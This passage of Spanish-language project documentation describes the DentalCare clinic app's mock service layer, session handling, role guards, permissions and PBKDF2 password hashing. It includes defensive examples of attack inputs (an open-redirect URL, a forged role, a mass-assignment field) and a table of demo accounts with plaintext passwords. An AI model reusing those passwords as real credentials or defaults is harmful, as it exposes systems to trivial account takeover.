- **Al cambiar de vista, el foco va al `<h1>`** (`tabindex="-1"`). Si no, tras pulsar "Enviar
  enlace" el formulario desaparece y el foco queda "en ninguna parte": el usuario de lector de
  pantalla no sabe qué pasó. Al enfocar el título, el lector anuncia "Revisa tu correo".
- **Mensajes que no revelan información (RF-ACC-02):** el login dice "Correo o contraseña
  incorrectos" (no cuál de los dos) y la recuperación dice "*Si* el correo está registrado,
  recibirás un enlace". Así un atacante no puede averiguar qué correos existen en el sistema
  (ataque de **enumeración de usuarios**).
- El panel de marca (izquierda) **no tiene encabezados**: el `<h1>` debe ser el de la tarjeta.
  En pantallas de menos de 960 px el panel se oculta y el logo pasa a la tarjeta.

### 11.8 DetailLayout: un template dentro de otro

La ficha del paciente va **dentro** del hueco de `DashboardLayout`: el marco pone la navegación y
las migas; `DetailLayout` organiza la ficha. **No rompe Atomic Design**: `DetailLayout` no importa
a `DashboardLayout` (ninguno depende del otro); es la **página** la que los compone.

| Zona | Contenido | Detalle técnico |
|---|---|---|
| Encabezado | Avatar, nombre (`<h1>`), estado, datos de contacto, acciones | Datos en `<dl>`: el ícono se ve, la etiqueta ("Teléfono") se lee con `u-visually-hidden` |
| Resumen | Próxima cita, última visita, citas completadas, hallazgos por tratar | `<dl>` en cuadrícula `auto-fit` |
| Alertas clínicas | Alergias, advertencias | **Siempre visibles** sobre las pestañas: un odontólogo no debe tener que abrir una pestaña para enterarse de una alergia |
| Pestañas | Datos personales / Odontograma / Citas | Contenido **perezoso**: el odontograma se construye solo si se abre su pestaña |
| Columna lateral | Historia clínica | `<aside>` (landmark "complementary") con nombre propio |

- **Container query** (`@container (min-width: 1000px)`): la columna lateral se pone al lado solo
  si **la ficha** tiene espacio, sin importar el ancho de la ventana (que incluye el sidebar).
- **`syncHash`** (opcional): la pestaña se refleja en la URL (`paciente.html?id=11#odontograma`)
  para poder enlazar directo a ella. Se usa `history.replaceState` y **no** `pushState`: cambiar
  de pestaña no debe llenar el historial (el botón "Atrás" debe volver a la página anterior, no a
  la pestaña anterior).

### 11.9 Landmarks: el mapa de la página

Los lectores de pantalla permiten saltar entre **regiones** (*landmarks*). Con los templates,
cada pantalla interna tiene:

| Región | Elemento | Nombre accesible |
|---|---|---|
| banner | `<header class="topbar">` | — |
| navigation | `<nav>` del sidebar | "Menú de Administrador" (según el rol) |
| navigation | `<nav>` de las migas | "Ruta de navegación" |
| main | `<main id="contenido-principal">` | — (es único) |
| complementary | `<aside>` de la ficha | "Información complementaria" |

### 11.10 Otras decisiones de A4

- **Superficies compartidas** en `app-shell.css`: `.card`, `.page-kpis`, `.page-columns` y
  `.data-list`, para que todas las páginas de A6 usen las mismas tarjetas y cuadrículas.
- **`minmax(min(100%, 220px), 1fr)`**: en un celular de 320 px, una columna de mínimo 220 px más
  el margen desbordaría la pantalla; `min(100%, …)` garantiza que nunca sea más ancha que su
  contenedor.
- **`min-height: 100dvh`** (además de `100vh`): en los celulares, `vh` no descuenta la barra del
  navegador que aparece y desaparece; `dvh` (*dynamic viewport height*) sí. Se deja `100vh` antes
  como respaldo para navegadores antiguos.
- **Mock nuevo:** `data/mock/historias.js` (tabla `historia_clinica` del seed) para la ficha.

---

## 12. Fase A5: capa de servicios, sesión y guards

Hasta A4 los componentes recibían datos "a mano". En A5 se construyó **de dónde salen los datos** y
**quién puede verlos**: una capa de servicios que hoy responde con una base de datos simulada en el
navegador y, en la fase D, llamará a la API de Node.js **sin que las páginas cambien una línea**.

| Pieza | Responsabilidad | Dónde está |
|---|---|---|
| `config.js` | Interruptor `USE_MOCK`, URL de la API, latencia simulada, duración de la sesión, prefijo de almacenamiento | `js/core/config.js` |
| `storage.js` | Envoltorio seguro de `localStorage` (prefijo, JSON, respaldo en memoria) | `js/core/storage.js` |
| `session.js` | Crear, leer, validar y cerrar la sesión; avisar de cambios (también entre pestañas) | `js/core/session.js` |
| `guard.js` | Proteger cada página: sin sesión → login; rol equivocado → 403 | `js/core/guard.js` |
| `permissions.js` | Matriz de permisos por rol (RF-ROL-07) | `js/core/permissions.js` |
| 9 servicios | `auth`, `pacientes`, `citas`, `historias`, `odontograma`, `servicios`, `especialistas`, `ventas`, `novedades` | `js/services/*.service.js` |
| `mock/db.js` | Base de datos simulada (las tablas del SQL en un JSON) y `mockRequest()` | `js/services/mock/db.js` |
| `mock/password.js` | Hash PBKDF2 de contraseñas | `js/services/mock/password.js` |
| `http.js` | Cliente `fetch` para la API real (fase D) | `js/services/http.js` |
| `api-error.js` | Un solo tipo de error para mock y API | `js/services/api-error.js` |
| `app-page.js` | Arranque común de las pantallas internas: guard + `DashboardLayout` + carga | `js/pages/_shared/app-page.js` |

### 12.1 El patrón *Service Layer* (capa de servicios)

**Problema:** si cada página leyera `localStorage` o llamara `fetch('/api/pacientes')` directamente,
cambiar la fuente de datos en la fase D obligaría a reescribir **todas** las páginas, y las reglas
(quién puede ver qué, validaciones) quedarían repartidas y duplicadas.

**Solución:** una capa intermedia. La página **pide** datos a un servicio; el servicio **sabe** de
dónde sacarlos. La vista queda **desacoplada** de la fuente de datos.

```
  PÁGINA (vista)                 CAPA DE SERVICIOS                     FUENTE DE DATOS
  pages/admin/pacientes.js  ──►  pacientesService.list({ q })  ──┬──►  mock/db.js → localStorage   (USE_MOCK = true)
  "muéstrame los pacientes"      misma interfaz, mismo error     └──►  http.js → API Express/MySQL (USE_MOCK = false)
```

Cada servicio tiene **dos implementaciones con la misma forma** (`mock` y `remote`) y exporta una:

```js
// js/services/citas.service.js
const mock   = { list: (filtros) => mockRequest(...),        create: (data) => mockRequest(...) };
const remote = { list: (filtros) => http.get('/citas', filtros), create: (data) => http.post('/citas', data) };

export const citasService = USE_MOCK ? mock : remote;
```

La página solo conoce el barrel `services/index.js`:

```js
import { pacientesService, isApiError } from '../../js/services/index.js';
try {
  const pacientes = await pacientesService.list({ q: 'galvis' });
} catch (error) {
  if (isApiError(error) && error.status === 409) { /* documento repetido */ }
}
```

**Ventajas que se pueden defender:**
- **Desacoplamiento:** cambiar de mock a API es cambiar **una constante**, no las páginas.
- **Un solo lugar para las reglas:** RN-01, RN-02, permisos y validaciones viven en el servicio.
- **Contrato explícito:** los métodos del mock imitan las rutas REST que tendrá la API
  (`GET /citas`, `PATCH /citas/:id/estado`…). El mock **es** la especificación del backend.
- **Errores uniformes:** mock y API lanzan el mismo `ApiError` (`status`, `message`, `fields`, `code`),
  así la página maneja los errores de una sola forma.
- **Comprobable:** los servicios se prueban en Node sin navegador (67 pruebas, §17).

| `status` de `ApiError` | Significado | Ejemplo |
|---|---|---|
| 0 | Sin conexión / tiempo agotado | La API no responde (fase D) |
| 400 | Datos inválidos (con `fields` por campo) | Paciente sin documento |
| 401 | Sin sesión o sesión vencida | Token expirado |
| 403 | Sin permiso | Recepción intenta editar una historia (RN-01) |
| 404 | No existe | Cita #9999 |
| 409 | Conflicto | Documento repetido, franja ocupada, cancelar dos veces |
| 422 | Regla de negocio | Fuera del horario del odontólogo (RN-02) |
| 507 | Almacenamiento lleno | `localStorage` sin espacio (solo mock) |

### 12.2 La bandera `USE_MOCK` y la configuración central

`js/core/config.js` reúne **todas** las decisiones que cambian entre entornos, en un solo archivo:

| Constante | Valor | Para qué |
|---|---|---|
| `USE_MOCK` | `true` | `true` = base simulada; `false` = API REST (fase D) |
| `API_BASE_URL` | `http://localhost:3000/api` | Raíz de la API de Express |
| `HTTP_TIMEOUT_MS` | 15 000 | Abortar una petición que tarda demasiado |
| `MOCK_LATENCY` | 150–300 ms | "Red" simulada |
| `SESSION_TTL_MS` | 8 horas | Una jornada del consultorio |
| `STORAGE_PREFIX` | `dentalcare:` | Prefijo de todas las claves de `localStorage` |

Es el principio de **configuración centralizada**: nadie escribe `'http://localhost:3000'` dentro de
un servicio. En la fase D basta con cambiar `USE_MOCK` a `false`.

### 12.3 La "petición" simulada: `mockRequest()` y la latencia controlada

Todos los servicios mock pasan por `mockRequest(handler, { auth, permiso, write })`, que imita lo
que hará el servidor con cada petición:

1. **Espera la latencia de red** (150–300 ms aleatorios).
2. **Autentica:** sin sesión → `401` (y cierra la sesión para que el guard lleve al login).
3. **Autoriza:** si la operación exige un permiso y el rol no lo tiene → `403`.
4. **Ejecuta** el `handler`, que lee o modifica las tablas y puede lanzar `400/404/409/422`.
5. **Commit o rollback:** si escribió y todo salió bien, guarda en `localStorage`; si falló,
   descarta la copia en memoria (lo guardado sigue intacto). Es la idea de una **transacción**.
6. **Devuelve una copia** (`structuredClone`): la página no puede modificar la "base de datos"
   por referencia, igual que con datos que llegan por la red.

**¿Por qué simular latencia si el mock podría responder al instante?**
- Con respuestas instantáneas **nunca se verían** los spinners, los estados `aria-busy` ni los
  botones deshabilitados mientras se guarda: se programarían "a ciegas".
- Los errores de asincronía (la **condición de carrera** de §11.6, doble clic en "Guardar") solo
  aparecen cuando hay espera. Con latencia aparecen **ahora**, no en la fase D.
- Es aleatoria (no fija) para que las respuestas puedan llegar en distinto orden, como en la red real.
- Es **controlada**: el rango está en `config.js` y las pruebas usan `setMockLatency(0)` para no esperar.

### 12.4 Persistencia segura: `storage.js`

La base simulada se guarda como **un** objeto JSON en `localStorage["dentalcare:db"]`; la sesión en
`localStorage["dentalcare:session"]`. Lo que se agenda o paga **sobrevive a recargas** y se ve en
todas las pantallas.

| Riesgo | Cómo se maneja |
|---|---|
| Otra aplicación en el mismo origen (Live Server sirve varios proyectos en `127.0.0.1:5500`) usa las mismas claves | **Prefijo** `dentalcare:` en todas las claves |
| `localStorage` no existe o lanza error (modo privado de Safari, almacenamiento bloqueado, Node.js en las pruebas) | Se **prueba** al iniciar (`setItem`/`removeItem` de una clave de sondeo); si falla, se usa un `Map` **en memoria**: la app funciona, solo que sin persistir (`storage.persistent === false`) |
| Dato corrupto o editado a mano (JSON inválido) | `JSON.parse` dentro de `try/catch`: se devuelve el valor por defecto, la app no se rompe |
| Almacenamiento lleno (≈5 MB, `QuotaExceededError`) | `set()` lanza; `db.js` lo convierte en `ApiError 507` con un mensaje entendible. El log de auditoría se recorta a los últimos 300 registros |
| La forma de las tablas cambia entre versiones del código | `DB_VERSION`: si lo guardado tiene otra versión, se descarta y se vuelve a sembrar desde los mocks |
| Dos pestañas abiertas | El evento `storage` avisa a las **otras** pestañas: descartan su copia en memoria y releen |

> **Límite que hay que reconocer:** `localStorage` **no es un lugar seguro**. Cualquier script de la
> página puede leerlo; por eso la defensa contra XSS (§5) es tan importante. Por eso tampoco se
> guarda nunca una contraseña: solo hashes en la base simulada y un token en la sesión. En la fase D
> se evaluará guardar el token en una *cookie* `HttpOnly` (inaccesible para JavaScript).

### 12.5 Control de sesión: `session.js`

```js
// localStorage["dentalcare:session"]
{ token: 'mock.3f2a…', user: { id_usuario: 1, rol: 'ADMINISTRADOR', nombre: 'Laura Gómez', … },
  createdAt: 1760850000000, expiresAt: 1760878800000 }   // + 8 horas
```

- **`setSession()`** la crea `auth.service` **después** de verificar la contraseña. Se valida la
  forma antes de guardar.
- **`getSession()`** es la **única** forma de leerla, y desconfía de lo guardado: si falta el token,
  el `id_usuario` no es entero, el rol no existe (`"HACKER"`) o ya venció, la **borra** y devuelve `null`.
- **`clearSession(reason)`** distingue `'logout'` (el usuario salió) de `'expired'` (venció o la API
  respondió 401) para mostrar el mensaje correcto en el login.
- **`onSessionChange()`** escucha un evento propio (`dc:session`) en **esta** pestaña y el evento
  `storage` de las **demás**: cerrar sesión en una pestaña saca al usuario de todas.
- **`handleUnauthorized()`**: cuando la API (o el mock) responde 401, la sesión ya no sirve y se cierra.

**Idea clave:** la sesión en el navegador es **comodidad**, no seguridad. Alguien puede editarla
desde las herramientas del navegador y ponerse `rol: 'ADMINISTRADOR'`. Eso le cambiaría el menú,
pero **no** los datos que recibe: en la fase D el servidor valida el token en cada petición y no
cree en el rol que diga el navegador.

### 12.6 Guards de acceso y redirección según el rol: `guard.js`

Cada página protegida llama al guard **antes de dibujar nada** (lo hace `createAppPage()`):

```js
const user = guard('ADMINISTRADOR');   // o guard(['ADMINISTRADOR', 'RECEPCIONISTA']) o guard(null)
if (!user) return;                     // ya se está redirigiendo: no dibujar nada
```

```
                ┌─ sin sesión / vencida ──► login.html?next=pages%2Fadmin%2Fcitas.html
 guard(rol) ────┼─ rol no permitido ──────► 403.html?from=pages%2Fadmin%2Fcitas.html
                └─ todo bien ─────────────► devuelve el usuario y VIGILA la sesión
                                            (logout, vencimiento u otro rol en otra pestaña → redirige)
```

| Decisión | Por qué |
|---|---|
| `location.replace()` y no `assign()` | La página prohibida **no queda en el historial**: "Atrás" no devuelve a ella ni crea un bucle de redirecciones |
| Parámetro `next` | Tras iniciar sesión, el usuario vuelve a la página que quería, no al inicio |
| `safeNext()` valida `next` | Evita la **redirección abierta** (*open redirect*): `login.html?next=https://sitio-falso.com` no debe sacar al usuario de DentalCare. Solo acepta páginas `.html` dentro de la app, que no sean login/403 y de la carpeta de **su** rol |
| Evento `pageshow` con `persisted` | El *bfcache* del navegador puede mostrar una página guardada en memoria al pulsar "Atrás" **sin ejecutar los scripts**. Si el usuario ya cerró sesión, `pageshow` vuelve a verificar |
| `redirectIfAuthenticated()` en el login | Si ya hay sesión, no tiene sentido mostrar el formulario: va al inicio de su rol |

Inicio de cada rol (`core/navigation.js → ROLES`):

| Rol (tabla `rol`) | Carpeta | Página de inicio |
|---|---|---|
| ADMINISTRADOR | `pages/admin/` | `dashboard.html` |
| RECEPCIONISTA | `pages/asistente/` | `inicio.html` |
| ESPECIALISTA | `pages/doctor/` | `dashboard.html` |
| PACIENTE | `pages/paciente/` | `inicio.html` |

**Defensa en profundidad (la frase clave):** hay **tres capas** y solo la última es seguridad real.

| Capa | Qué hace | ¿Es seguridad? |
|---|---|---|
| 1. Interfaz | El sidebar solo muestra el menú del rol; `can()` oculta botones | No: es experiencia de usuario |
| 2. Guard | Impide **navegar** a páginas de otro rol | No: se puede saltar editando el JavaScript |
| 3. Servicio / API | Cada operación verifica sesión (401), permiso (403) y propiedad del dato | **Sí** (y en la fase C, en el servidor) |

### 12.7 Autorización dentro de los servicios

- **Matriz de permisos** (`permissions.js`, RF-ROL-07). `can(user, 'REGISTRAR_PAGO')` responde sí o
  no. Se tomaron los 6 permisos de la tabla `permiso` y se agregaron 5 que el SRS necesita.

  | Rol | Permisos |
  |---|---|
  | ADMINISTRADOR | Todos |
  | RECEPCIONISTA | Crear y cancelar citas, gestionar pacientes, registrar pagos, registrar novedades |
  | ESPECIALISTA | Crear y cancelar citas, ver y editar historias clínicas, registrar novedades |
  | PACIENTE | Crear y cancelar citas (solo las suyas) |

  **No se copió `rol_permiso` del seed** porque contradice el SRS: la recepcionista podía editar
  historias (viola RN-01) y el especialista podía registrar pagos. Se documentará en la fase B.
- **Propiedad del dato:** un PACIENTE solo ve y cambia **lo suyo** (`assertOwnPaciente` → 403). Al
  agendar, el servicio **ignora** el `id_paciente` que envíe y usa el de su sesión.
- **RN-01 en código** (`assertRN01`): solo el administrador o el odontólogo **asignado** (con una
  cita no cancelada con ese paciente) editan la historia clínica.
- **Lista blanca de campos** (`pick()`): el servicio copia solo las columnas permitidas. Si alguien
  envía `{ estado_cita: 'COMPLETADA' }` al crear una cita, se ignora (ataque de **asignación masiva**).
- **Máquina de estados de la cita:** `PENDIENTE_CONFIRMACION → PROGRAMADA → COMPLETADA`, y
  `CANCELADA` desde las dos primeras. Cancelar dos veces o completar una cancelada → 409. Las citas
  **no se borran**, se cancelan (queda la traza).
- **Auditoría** (RNF-SEG-02): login, login fallido, logout, crear, reprogramar, pagar… quedan en la
  tabla `log_auditoria` con usuario, acción, tabla y fecha.

### 12.8 Seguridad de contraseñas: PBKDF2 en el mock, bcrypt en el backend

**Hash no es cifrado.** El cifrado se puede revertir con la clave; el **hash es de un solo sentido**.
Para verificar una contraseña no se "descifra" nada: se calcula el hash de lo que escribió el
usuario y se compara con el guardado.

El seed de `dentalcare_bd.sql` guarda las contraseñas **en texto plano** (`'Admin2026*'`), lo que
incumple RNF-SEG-01. En el mock ya están convertidas (con un script de Node, una sola vez):

```
pbkdf2_sha256 $ 100000 $ yT9xLHL20S3LAzUF0UBkUg== $ 54958FCbp12A0aHhkyyINljIvceUQbjNJcjKOBef05g=
 algoritmo      iteraciones   sal (16 bytes, base64)        hash (32 bytes, base64)
```

| Concepto | Qué es | Contra qué protege |
|---|---|---|
| **Sal** aleatoria por usuario | Bytes al azar que se mezclan con la contraseña | Dos usuarios con la misma clave tienen hashes distintos; inutiliza las *rainbow tables* (tablas de hashes precalculados) |
| **100 000 iteraciones** | El cálculo se repite a propósito para que sea **lento** (una fracción de segundo) | Fuerza bruta: probar millones de claves robadas se vuelve muy costoso |
| **Comparación en tiempo constante** (`sameBytes`) | Recorre **todos** los bytes aunque el primero ya sea distinto | Ataque de tiempo (*timing attack*): medir cuánto tarda la comparación |
| **`fakeVerify`** | Si el correo no existe, igual se calcula un hash | Que no se pueda saber qué correos existen midiendo el tiempo de respuesta (enumeración) |
| Formato con el número de iteraciones | Las iteraciones viajan dentro del hash | Subirlas en el futuro sin invalidar las contraseñas existentes |

**¿Por qué PBKDF2 en el frontend y bcrypt en el backend?**

| | PBKDF2-SHA256 (mock, fase A5) | bcrypt (backend, fase C) |
|---|---|---|
| Dónde corre | Navegador, con **Web Crypto** (`crypto.subtle`), nativo | Node.js, librería `bcryptjs` (bcrypt en JavaScript puro: no necesita compilar nada en Windows) |
| Por qué ahí | bcrypt **no existe** nativo en el navegador y la regla es no usar librerías externas | Es el estándar en Node y lo pide el proyecto |
| Costo | Iteraciones (100 000) | Factor de costo (p. ej. 10 → 2¹⁰ rondas) |
| Sal | Aparte, 16 bytes | Incluida automáticamente en el hash |
| ¿Cumple RNF-SEG-01? | Sí: hash lento con sal, recomendado por NIST | Sí |

Lo importante en los dos: **la contraseña nunca se guarda ni se compara en texto plano**. Y el hash
del frontend es **solo para el mock**: cuando exista el backend, la contraseña viajará por HTTPS y
el **servidor** la verificará con bcrypt (el navegador no debe decidir si alguien entra).

> **Requisito técnico:** Web Crypto solo existe en **contextos seguros** (`https`, `localhost` o
> `127.0.0.1`). Live Server abre `http://127.0.0.1:5500`, que sí lo es. Si se abre por la IP de la
> red local, `password.js` muestra un mensaje claro (`NO_CRYPTO`) en lugar de fallar en silencio.

**Recuperación de contraseña (HU-01) en el mock:**
- Siempre el **mismo mensaje** exista o no el correo ("*Si* el correo está registrado…").
- Token aleatorio (`crypto.randomUUID()`), válido **30 minutos** y de **un solo uso**. Pedir un
  enlace nuevo anula los anteriores.
- Al verificar el enlace se muestra el correo **enmascarado** (`a••••••@gmail.com`).
- Como el mock no envía correos, el enlace queda en una "bandeja de salida" simulada
  (`mockOutbox(email)`), que solo existe con `USE_MOCK = true`.

### 12.9 El cliente HTTP ya está listo para la fase D (`http.js`)

- Agrega `Authorization: Bearer <token>` de la sesión en cada petición.
- **Tiempo límite** con `AbortController`: a los 15 s se aborta y se lanza `ApiError(0, 'El
  servidor tardó demasiado…')`. Sin esto, un servidor colgado dejaría el spinner para siempre.
- Convierte cualquier respuesta no exitosa en `ApiError`, con el **mismo formato** que el mock.
- Un `401` cierra la sesión (`handleUnauthorized`) y el guard lleva al login con `?expired=1`.

### 12.10 Credenciales de demostración

Son las del seed (`dentalcare_bd.sql`); en el mock se verifican contra su hash PBKDF2.

| Rol | Correo | Contraseña |
|---|---|---|
| Administrador | `admin@dentalcare.com` | `Admin2026*` |
| Recepcionista | `recepcion@dentalcare.com` | `Recep2026*` |
| Odontólogo | `dr.roberto@dentalcare.com` | `DocRoberto2026*` |
| Paciente | `andres.galvis@gmail.com` | `AndresG2026*` |

Para volver a los datos iniciales: `resetDemoData()` (exportado por `services/index.js`).

### 12.11 Diferencias con la base de datos (resueltas en la fase B)

Detectadas al construir el mock. **Ya están aplicadas** en la base v2 y explicadas en
`database/CAMBIOS.md` (§15):
1. `usuario.password_hash` en texto plano → hash (bcrypt en el backend).
2. `rol.estado` no existe y lo pide RF-ROL-06.
3. `rol_permiso` contradice el SRS (ver §12.7) y faltan 5 permisos.
4. Falta una tabla de tokens de recuperación de contraseña (`password_reset`, HU-01).
5. Ventas del seed marcadas `PAGADO` con saldo pendiente (p. ej. la #2: 350.000 con 150.000
   abonados); el mock recalcula el estado desde el saldo.
6. `paciente.departamento` y `paciente.municipio` (nuevas, opcionales): ubicación elegida de la
   lista DIVIPOLA de Datos Abiertos (§14.6).

Al revisar la base en la fase B aparecieron más: `cita.id_servicio` y los horarios que el mock ya
usaba, la tabla `paciente_venta` duplicada y la sección de prácticas CRUD dentro del script de
instalación. La lista completa (B-00 a B-10) está en §15.1.

### 12.12 Punto de partida de la fase A6 (pantallas HTML definitivas)

La fase A6 **no** debe tocar la capa de servicios: solo crear los HTML y sus controladores. El
contrato que cada pantalla interna debe cumplir:

```html
<!-- pages/admin/pacientes.html -->
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Pacientes · DentalCare</title>
  <link rel="stylesheet" href="../../css/main.css" />
  <script type="module" src="../../js/pages/admin/pacientes.js"></script>
</head>
<body data-role="ADMINISTRADOR"></body>
</html>
```

```js
// js/pages/admin/pacientes.js
const page = createAppPage({ role: 'ADMINISTRADOR', activeId: 'pacientes', title: 'Pacientes' });
if (page) {
  const pacientes = await loadInto(page.layout, () => pacientesService.list(), 'Cargando pacientes…');
  if (pacientes) page.layout.setContent(DataTable({ ... }));
}
```

Reglas para A6:
- Importar datos **solo** desde `js/services/index.js` (nunca `data/mock/` ni `mock/db.js`).
- Toda pantalla interna arranca con `createAppPage()` (guard + layout) y carga con `loadInto()`.
- Mostrar u ocultar botones con `can(user, PERMISO)`, sabiendo que el servicio vuelve a verificar.
- Errores de campo del servicio (`error.fields`) → junto al input con `setFieldError()`.
- Pantallas pendientes: `login.html` (con `?next`, `?expired=1` y `?token=` de recuperación),
  `403.html`, una entrada `index.html` que lleve al login o al inicio del rol, y las páginas de
  cada rol listadas en `core/navigation.js → NAV_BY_ROLE`. `js/pages/home.js` ya sirve el inicio
  de los cuatro roles (`<body data-role="…">`).

> **Cómo quedó en A6:** en vez de un controlador por carpeta (`js/pages/admin/pacientes.js`), se usó
> un controlador **por vista** compartido entre roles (`js/pages/pacientes.js`), que toma el rol de
> `<body data-role>`. Ver §13.1.

---

## 13. Fase A6: pantallas definitivas por rol

En A6 se construyó el **último nivel de Atomic Design: las páginas**. Cada pantalla es un HTML
casi vacío más un controlador que: (1) verifica sesión y rol, (2) pide datos a los servicios y
(3) los muestra con los organismos que ya existían. **No se escribió ningún componente nuevo**: se
compusieron los de A1–A4.

| Rol | Carpeta | Pantallas | Organismos que usa |
|---|---|---|---|
| — (entrada) | `frontend/` | `index.html`, `login.html`, `403.html` | `AuthLayout` |
| Administrador | `pages/admin/` | `dashboard`, `pacientes`, `citas`, `especialistas`, `servicios`, `pagos`, `reportes` | `DataTable`, `Calendar`, `BookingWizard`, `ModalForm`, `DashboardCharts`, `BarChart` |
| Recepcionista | `pages/asistente/` | `inicio`, `agenda`, `pacientes`, `pagos`, `novedades` | `Calendar`, `BookingWizard`, `DataTable`, `ModalForm` |
| Odontólogo | `pages/doctor/` | `dashboard`, `agenda`, `pacientes`, `historia` (ficha), `novedades` | `Calendar`, `DetailLayout`, `Odontogram`, `DataTable` |
| Paciente | `pages/paciente/` | `inicio`, `agendar`, `mis-citas`, `mi-historia`, `mis-pagos` | `BookingWizard`, `DetailLayout`, `Odontogram` (solo lectura), `DataTable` |

### 13.1 Un controlador por vista, compartido entre roles

25 HTML, pero solo **14 controladores** en `js/pages/`. "Pacientes" existe para tres roles y es la
misma vista con distintos permisos: `pages/admin/pacientes.html`, `pages/asistente/pacientes.html` y
`pages/doctor/pacientes.html` cargan el mismo `js/pages/pacientes.js`. Lo que cambia es el rol que
declara cada HTML:

```html
<body data-role="RECEPCIONISTA">   <!-- pages/asistente/pacientes.html -->
```

```js
// js/pages/pacientes.js
const page = createAppPage({ activeId: 'pacientes', title: 'Pacientes' }); // rol ← <body data-role>
const gestiona = can(user, PERMISOS.GESTIONAR_PACIENTES);  // admin y recepción: crear/editar/eliminar
const esOdontologo = user.rol === 'ESPECIALISTA';           // odontólogo: "Ver ficha clínica"
```

| Controlador | Pantallas que atiende |
|---|---|
| `home.js` | inicio/dashboard de los 4 roles |
| `pacientes.js` | admin, asistente, doctor |
| `citas.js` | `admin/citas`, `asistente/agenda`, `doctor/agenda` |
| `pagos.js` | `admin/pagos`, `asistente/pagos`, `paciente/mis-pagos` |
| `novedades.js` | `asistente/novedades`, `doctor/novedades` |
| `historia.js` | `doctor/historia?id=…`, `paciente/mi-historia` |
| `especialistas.js`, `servicios.js`, `reportes.js` | solo administrador |
| `agendar.js`, `mis-citas.js` | solo paciente |
| `entry.js`, `login.js`, `forbidden.js` | `index.html`, `login.html`, `403.html` |

**¿Por qué?** Evita copiar y pegar (DRY): una corrección en la tabla de pacientes llega a los tres
roles. Y como el rol que decide es el de la **sesión**, no el del HTML, alguien que edite el
`data-role` no gana nada: el guard compara contra su sesión y lo manda al 403.

**Detalle de seguridad:** si a una página se le olvidara el `data-role`, `guard(undefined)` dejaría
entrar a **cualquier** usuario con sesión. Por eso `createAppPage()` lanza un error si no recibe
rol: es preferible una página rota durante el desarrollo a una página abierta sin querer.

Piezas compartidas en `js/pages/_shared/`:
- `app-page.js`: `createAppPage()` (guard + layout) y `loadInto()` (carga con spinner y error con "Reintentar").
- `ui.js`: `card()`, `dataList()`, `notice()`, `crumbs()`, `withFieldErrors()`, `runAction()`.
- `citas.js`: columnas, filtros y **acciones por estado** de las citas (las usan 4 pantallas).

### 13.2 El HTML de cada página

```html
<head>
  <title>Pacientes · DentalCare</title>
  <link rel="icon" href="../../favicon.svg" type="image/svg+xml" />
  <link rel="stylesheet" href="../../css/main.css" />
  <script type="module" src="../../js/pages/pacientes.js"></script>
</head>
<body data-role="ADMINISTRADOR">
  <noscript><p class="noscript">DentalCare necesita JavaScript activado para funcionar.</p></noscript>
</body>
```

- `type="module"` se ejecuta **diferido** (después de leer el HTML), aunque esté en el `<head>`:
  cuando corre, `document.body` ya existe.
- El `<title>` inicial es el que se ve mientras carga; luego `DashboardLayout` lo actualiza.
- `<noscript>`: sin JavaScript la app no funciona, y se dice en vez de mostrar una página en blanco.
- `<meta name="robots" content="noindex">`: son pantallas internas, no deben aparecer en buscadores.
- Los 25 HTML se generaron con un script a partir de una tabla (ruta, rol, título, controlador),
  para que todos tengan **exactamente** el mismo esqueleto.

### 13.3 Entrada: `index.html`, `login.html` y `403.html`

| Pantalla | Comportamiento |
|---|---|
| `index.html` | No dibuja nada: con sesión → inicio del rol; sin sesión → login. Usa `location.replace` para no quedar en el historial |
| `login.html` | Vistas de `AuthLayout` sin recargar: **ingresar → recuperar → "revisa tu correo" → contraseña nueva** |
| `login.html?next=…` | Tras ingresar vuelve a esa página, **validada** con `safeNext()` (§12.6) |
| `login.html?expired=1` | Aviso "Tu sesión terminó por seguridad" (`role="status"`) |
| `login.html?token=…` | Verifica el enlace: si sirve, pide la contraseña nueva; si no, "Enlace no válido" y opción de pedir otro. Luego quita el token de la URL con `history.replaceState` |
| `403.html?from=…` | "Acceso denegado", la página pedida (como texto, nunca como HTML), "Ir a mi inicio" e "Ingresar con otra cuenta" |

- **Error de login junto al campo:** el 401 se muestra en la contraseña con `setFieldError` y el
  mismo texto para correo o contraseña equivocados (RF-ACC-02). Los demás errores (cuenta inactiva,
  sin conexión) van en una alerta arriba del formulario.
- **Cuentas de demostración:** un `<details>` con las 4 cuentas; un clic llena el formulario. Las
  entrega `demoAccounts()` del servicio de autenticación, que con `USE_MOCK = false` devuelve una
  lista **vacía**: con la API real ese panel desaparece solo.

### 13.4 Menú por rol = pantallas que existen

El menú de A3 (`NAV_BY_ROLE`) tenía enlaces a pantallas que no se iban a construir en A6 (roles y
usuarios, historias del administrador, configuración del odontólogo…). Un enlace a una página que no
existe es un error 404 para el usuario, así que el menú se **alineó** con las 25 pantallas. Las
fichas (`doctor/historia.html?id=…`) no van en el menú: se abren desde Pacientes o desde la Agenda.

### 13.5 Errores del servicio dentro de los formularios

El servicio responde `ApiError(409, …, { fields: { numero_documento: 'Ya existe…' } })`, pero
`ModalForm` muestra junto al campo solo los errores con `.field`. `withFieldErrors()` traduce uno en
el otro:

```js
onSubmit: withFieldErrors((data) => pacientesService.create(data)),
// ApiError.fields.numero_documento → FieldError('numero_documento', 'Ya existe…') → junto al input
```

Así el usuario ve el error **en el campo que debe corregir**, con el foco puesto ahí, y no en un
mensaje genérico arriba del formulario.

### 13.6 Privacidad al agendar: `citasService.ocupacion()`

El `BookingWizard` calcula las franjas libres con las citas existentes (RN-02). Para recepción eso
no es problema, pero **el paciente no puede ver las citas de otros pacientes**: `citasService.list()`
solo le devuelve las suyas. Si el wizard usara solo esas, le ofrecería franjas ocupadas y fallaría al
guardar.

Solución: un método nuevo que entrega **solo lo necesario** para calcular disponibilidad:

```js
citasService.ocupacion({ desde: '2026-10-19' })
// → [{ id_especialista: 1, fecha_hora: '2026-10-20 09:00:00', estado_cita: 'PROGRAMADA' }, …]
//   sin id_cita, sin id_paciente, sin nombres
```

Es la idea de **minimización de datos**: cada pantalla recibe solo lo que necesita. Va en la línea
del principio de *acceso y circulación restringida* de la Ley 1581 de 2012 (protección de datos
personales en Colombia), y los datos de salud son datos **sensibles**. Hay una prueba que verifica que cada registro tiene
exactamente esas tres claves.

### 13.7 Ajustes a organismos (sin romper lo anterior)

| Pieza | Cambio | Por qué |
|---|---|---|
| `BookingWizard` | `pacienteId` (paciente fijo: se omite el paso 1) | En el portal, el paciente es el de la sesión |
